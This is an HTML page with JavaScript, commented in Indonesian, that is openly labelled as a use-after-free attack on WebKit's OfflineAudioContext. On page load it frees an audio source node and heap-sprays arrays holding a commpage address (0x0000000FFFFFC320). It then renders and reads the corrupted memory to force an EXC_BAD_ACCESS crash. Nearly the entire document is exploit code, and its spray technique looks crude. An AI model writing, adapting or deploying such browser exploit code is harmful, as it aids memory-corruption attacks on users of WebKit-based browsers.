<!DOCTYPE html>
<html>
<head>
    <title>OfflineAudioContext UAF (Synchronous Attack)</title>
</head>
<body>

    <h1>OfflineAudioContext UAF (Sinkron Agresif)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Audio Context Sinkron...</p>
    <div id="log"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
        
        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);

        let offlineCtx = null;
        let victimNode = null;
        let payloadHolders = []; 

        function log(message) {
            document.getElementById('log').innerHTML += `<div style="margin: 2px 0;">${message}</div>`;
        }
        
        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            const SPRAY_COUNT = 1500; // Peningkatan agresivitas spray
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                payloadArray[0] = HIGH_WORD; 
                payloadArray[1] = LOW_WORD;
                payloadArray[2] = 2028.0 + i; 
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runOfflineAttack() {
            log("Phase 1: Membuat OfflineAudioContext.");
            
            // 1. Inisialisasi Offline Context (Sinkron)
            try {
                // Buat context kecil, cepat selesai
                offlineCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100 * 1, 44100); 
            } catch(e) {
                log("ERROR: OfflineAudioContext tidak didukung.");
                return;
            }

            // 2. Alokasi Korban (Victim Node)
            let buffer = offlineCtx.createBuffer(1, 44100, 44100);
            victimNode = offlineCtx.createBufferSource();
            victimNode.buffer = buffer;
            victimNode.connect(offlineCtx.destination);
            victimNode.start(0);

            log("Phase 2: Node Korban dibuat dan terhubung.");

            // 3. FREE DAN SPRAY SINKRON AGRESIIF
            // Ini adalah bagian paling sensitif. Kita lakukan FREE dan SPRAY tanpa setTimeout.
            
            // FREE: Putuskan koneksi (memungkinkan C++ me-free node)
            victimNode.disconnect(); 
            // Hapus referensi JS
            victimNode = null; 
            buffer = null;

            log("Phase 3: FREE Node Korban (Pointer Dangling).");
            
            // SPRAY: Tepat setelah FREE (Hampir sinkron)
            sprayPayload(); 
            log("Phase 4: Heap Spray Commpage Payload.");

            // 4. Memicu Trigger Cleanup/Dereference
            log("Phase 5: Memulai Render Sinkron...");
            
            // Panggil render. Ini akan memaksa WebKit membersihkan dan menggunakan objek di Audio Thread.
            offlineCtx.startRendering().then(() => {
                // Jika tidak crash di render, coba trigger dereference JS pasca render
                log("Render Selesai. Memicu Trigger Alternatif...");
                triggerAlternativeCrash();
            }).catch(e => {
                // Jika error, seringkali ini adalah tanda UAF/Corruption
                log("Render GAGAL (Sinyal UAF/Corrupt): " + e.message);
                triggerAlternativeCrash();
            });

        }
        
        // Trigger Alternatif (Mirip UAF/Dereference sebelumnya)
        function triggerAlternativeCrash() {
             // 1. Coba alokasi objek Web Audio yang sama
             let attackerCtx = new (window.AudioContext || window.webkitAudioContext)();
             let attackerBuffer = attackerCtx.createBuffer(1, 44100, 44100); 
             let attackerView = attackerBuffer.getChannelData(0);
             
             try {
                 // 2. Akses memori di alamat awal buffer yang sekarang mungkin berisi pointer rusak
                 let crashPtr = attackerView[0]; 
                 
                 // 3. FORCE CRASH: Gunakan nilai pointer yang didapat
                 let crashNode = attackerCtx.createOscillator();
                 // Menggunakan Commpage Address sebagai frekuensi yang tidak valid
                 crashNode.frequency.value = crashPtr; 

             } catch(e) {
                 log("JS Error/Guard: " + e.message + " - Menunggu Crash OS (EXC_BAD_ACCESS).");
             }
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian OfflineAudioContext...';
            setTimeout(runOfflineAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah FREE-SPRAY Sinkron.';
        });

    </script>
</body>
</html>
